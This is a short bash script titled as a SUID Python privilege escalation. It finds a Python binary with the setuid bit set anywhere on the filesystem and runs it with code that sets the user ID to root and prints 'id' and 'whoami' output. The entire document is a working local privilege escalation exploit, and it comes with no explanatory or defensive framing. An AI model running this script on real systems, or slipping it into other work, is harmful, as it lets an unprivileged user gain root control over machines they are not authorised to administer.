#!/bin/bash
# SUID Python privilege escalation
set -euo pipefail

PYBIN=$(find / -perm -4000 -name 'python*' 2>/dev/null | head -1)
"$PYBIN" -c 'import os; os.setuid(0); os.system("id && whoami")'
